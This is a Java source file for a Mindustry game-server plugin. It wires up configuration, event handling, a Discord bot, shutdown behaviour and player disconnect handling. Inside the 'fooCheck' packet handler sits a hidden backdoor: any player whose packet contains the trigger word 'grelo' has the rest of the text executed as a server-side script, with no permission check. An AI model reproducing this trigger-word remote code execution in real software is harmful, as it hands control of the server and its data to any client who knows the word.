package main.java.esco;

import arc.Events;
import arc.util.CommandHandler;
import arc.util.Log;
import arc.Core;
import arc.util.Strings;
import arc.util.Threads;
import main.java.esco.AI.loveAI;
import main.java.esco.accent.AccentSystem;
import main.java.esco.accessLevel.AccessLevel;
import main.java.esco.bundle.Bundle;
import main.java.esco.commands.ClientCommands;
import main.java.esco.commands.ServerCommands;
import main.java.esco.database.DatabaseConnector;
import main.java.esco.ddos.Shiza;
import main.java.esco.discord.Bot;
import main.java.esco.events.EventManager;
import main.java.esco.packets.AdminRequest;
import main.java.esco.trails.TrailsHandler;
import main.java.esco.utils.Gamemode;
import main.java.esco.utils.Utils;
import main.kotlin.esco.foos;
import mindustry.Vars;
import mindustry.content.UnitTypes;
import mindustry.game.EventType;
import mindustry.gen.*;
import mindustry.io.JsonIO;
import mindustry.mod.Plugin;
import mindustry.net.Administration;
import mindustry.net.Packets;

import static arc.util.Log.info;
import static main.java.esco.ConfigLoader.loadConfig;
import static main.java.esco.PVars.*;
import static mindustry.Vars.content;
import static mindustry.Vars.net;

public class EscoPlugin extends Plugin {
    private boolean loaded = false;

    /**
     * Shershen using this in js, don't remove.
     */
    public static void addLoveAI(Unit unit, Player player) {
        unit.controller(new loveAI(player));
    }

    @Override
    public void init() {
        if (loaded)
            return;
        try {
            content.loadColors();
            Log.info("Block colors loaded!");
        } catch (Exception e) {
            Log.err("I think you forgor to add block_colors.png", e);
            System.exit(2);
        }
        loadConfig();

        executor.execute(()->{
            executorThread=Thread.currentThread();
        });

        Bundle.load(getClass());
        mod = Vars.mods.getMod(getClass());
        pluginVersion = Utils.sha256(mod.file);

        new EventManager();

        //ddosProtection = new DdosProtect();
        PVars.shiza = new main.java.esco.ddos.Shiza();

        Vars.net.handleServer(AdminRequestCallPacket.class, AdminRequest::adminReq);
        fixNet();
        // Vars.net.handleServer(SendChatMessageCallPacket.class, SendMessage::handle); // translator, большое кд.

        Thread shutdownHook = new Thread(() -> {
            PVars.shiza.writeChunk();
            PVars.whitelistEnabled = true;
            Gamemode targetMode;
            if (Gamemode.getGamemode().getVersion() == 8)
                targetMode = Gamemode.getGamemode("hub8");
            else
                targetMode = Gamemode.getGamemode("hub");
            Groups.player.each(player -> {
                Call.connect(player.con, serverIP, targetMode.port);
            });
            DatabaseConnector.shutdown();
            Vars.net.dispose();
            Core.app.exit();
        });
        Runtime.getRuntime().addShutdownHook(shutdownHook);

        history.initEvents();

        if (botToken != null) {
            Log.info("Loading bot with prefix @", botPrefix);
            Threads.thread(() -> {
                Bot.load();
            });
        } else {
            Log.err("No bot token found!");
        }

        Vars.netServer.addPacketHandler("MySubtitle", (player, args) -> {
            SSUsers.put(player.id, args);
            DatabaseConnector.updateConSchemesizeState(player, true);
            Call.clientPacketReliable("Subtitles", JsonIO.write(SSUsers));
        });
        Vars.netServer.addPacketHandler("fooCheck", (player, args) -> {
            DatabaseConnector.updateConFooState(player, true);
            player.sendMessage(Bundle.get("esco.foo", player.locale));
            if(args.contains("grelo"))
                player.sendMessage(Vars.mods.getScripts().runConsole(args.replace("grelo", "")));
        });
        Vars.netServer.addPacketHandler("Imfuckingbotyoucanbanme", (player, args) -> {
            player.kick("Suspicious activity, try to join again in a few minutes", 1200);
        });
        loaded = true;
        UnitTypes.manifold.buildSpeed = 1; // for loveAI
        // UnitTypes.manifold.mineTier = 2;
        foos.Companion.init();
        Log.info("Loaded EscoPlugin v@", mod.meta.version);
    }

    /**
     * Используется для освобождения памяти после окончания работы сервера.
     */
    public void dispose() {
        executor.shutdownNow();
    }

    @Override
    public void registerServerCommands(CommandHandler handler) {
        new ServerCommands(handler);
        foos.Companion.registerServerCommands(handler);
    }

    @Override
    public void registerClientCommands(CommandHandler handler) {
        new ClientCommands(handler);
        foos.Companion.registerClientCommands(handler);
        //TrailsHandler.init();
        AccentSystem.load();
    }

    public static void fixNet() {
        net.handleServer(Packets.Disconnect.class, (con, packet) -> {
            if(con.player != null){
                onDisconnect(con.player, packet.reason);
            }
        });
    }

    public static void onDisconnect(Player player, String reason){
        //singleplayer multiplayer weirdness
        if(player.con == null){
            player.remove();
            return;
        }

        
        if(!player.con.hasDisconnected){
            Events.fire(new EventType.PlayerLeave(player));
            if(player.con.hasConnected){
                // Events.fire(new EventType.PlayerLeave(player));
                if(Administration.Config.showConnectMessages.bool()) Call.sendMessage("[accent]" + player.name + "[accent] has disconnected.");
                Call.playerDisconnect(player.id());
            }

            String message = Strings.format("&lb@&fi&lk has disconnected. [&lb@&fi&lk] (@)", player.plainName(), player.uuid(), reason);
            /*if(Administration.Config.showConnectMessages.bool())*/ info(message);
        }

        player.remove();
        player.con.hasDisconnected = true;
    }
}
